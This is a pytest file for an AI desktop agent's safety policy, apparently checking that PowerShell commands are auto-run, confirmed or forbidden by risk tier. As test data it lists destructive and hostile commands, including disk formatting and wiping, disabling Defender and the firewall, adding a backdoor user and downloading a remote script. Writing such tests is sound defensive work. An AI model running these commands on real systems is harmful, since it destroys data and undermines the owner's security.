from src.brain.policy import Policy, classify_command
from src.brain.types import Proposal, ProposalKind, Verdict

KNOWN = {
    "powershell", "open_app", "system_info", "network_info",
    "computer_screenshot", "remember", "recall", "desktop_control",
}


def _speak(msg="hello"):
    return Proposal(kind=ProposalKind.SPEAK, message=msg)


def _act(tool, **args):
    return Proposal(
        kind=ProposalKind.ACT, message="do the thing", tool=tool, args=args
    )


def _ps(cmd):
    return _act("powershell", command=cmd)


# ---------------------------------------------------------------- tiers


def test_classify_command_tiers():
    assert classify_command("Format-Volume -DriveLetter D") == "catastrophic"
    assert classify_command("diskpart /s script.txt") == "catastrophic"
    assert classify_command("Remove-Item -Recurse C:\\Windows\\System32") == (
        "catastrophic"
    )
    assert classify_command("Stop-Service -Name Spooler") == "dangerous"
    assert classify_command("Set-NetFirewallProfile -Enabled False") == (
        "dangerous"
    )
    assert classify_command("Remove-Item -Recurse .\\build") == "dangerous"
    assert classify_command("Get-Process | Sort-Object CPU") == "ordinary"
    assert classify_command("New-Item note.txt -ItemType File") == "ordinary"


# ---------------------------------------------------------------- speak


def test_speech_is_always_auto():
    assert Policy("ask", KNOWN).evaluate(_speak()).verdict is Verdict.AUTO


# ---------------------------------------------------------------- voice surface


def test_voice_runs_ordinary_actions_freely():
    p = Policy("full", KNOWN, surface="voice")
    assert p.evaluate(_act("open_app", app="notepad")).verdict is Verdict.AUTO
    assert p.evaluate(_ps("New-Item C:\\tmp\\a.txt")).verdict is Verdict.AUTO
    assert p.evaluate(
        _act("desktop_control", action="click", x=10, y=10)
    ).verdict is Verdict.AUTO


def test_voice_asks_before_dangerous():
    p = Policy("full", KNOWN, surface="voice")
    for cmd in (
        "Stop-Service -Name WinDefend",
        "Set-NetFirewallProfile -Profile Domain -Enabled False",
        "Restart-Computer -Force",
        "net user backdoor Passw0rd /add",
        "Register-ScheduledTask -TaskName t -Action $a",
        "iwr http://x/y.ps1 -OutFile y.ps1",
        "Remove-Item -Recurse C:\\Users\\ahmed\\Downloads\\old",
    ):
        assert p.evaluate(_ps(cmd)).verdict is Verdict.CONFIRM, cmd


def test_voice_refuses_catastrophic():
    p = Policy("full", KNOWN, surface="voice")
    for cmd in (
        "Format-Volume -DriveLetter C -Force",
        "Clear-Disk -Number 0 -RemoveData",
        "Remove-Item -Recurse -Force C:\\Windows",
        "cipher /w:C:\\",
        "bcdedit /deletevalue safeboot",
    ):
        assert p.evaluate(_ps(cmd)).verdict is Verdict.FORBID, cmd


# ---------------------------------------------------------------- brain surface


def test_brain_is_stricter_than_voice():
    brain = Policy("full", KNOWN, surface="brain")
    # ordinary mutation: voice runs it, brain asks
    assert brain.evaluate(_ps("New-Item C:\\tmp\\a.txt")).verdict is (
        Verdict.CONFIRM
    )
    # dangerous: both ask
    assert brain.evaluate(_ps("Stop-Service Spooler")).verdict is Verdict.CONFIRM
    # catastrophic: both refuse
    assert brain.evaluate(_ps("Format-Volume -DriveLetter D")).verdict is (
        Verdict.FORBID
    )


def test_brain_auto_runs_readonly():
    brain = Policy("full", KNOWN, surface="brain")
    assert brain.evaluate(
        _ps("Get-Process | Sort-Object CPU -Descending | Select-Object -First 5")
    ).verdict is Verdict.AUTO
    assert brain.evaluate(_act("system_info", query="disks")).verdict is (
        Verdict.AUTO
    )


def test_brain_reversible_tool_auto_in_full():
    brain = Policy("full", KNOWN, surface="brain")
    assert brain.evaluate(_act("open_app", app="notepad")).verdict is Verdict.AUTO


def test_unknown_tool_forbidden_when_catalogue_known():
    assert Policy("full", KNOWN, surface="voice").evaluate(
        _act("format_c_drive")
    ).verdict is Verdict.FORBID
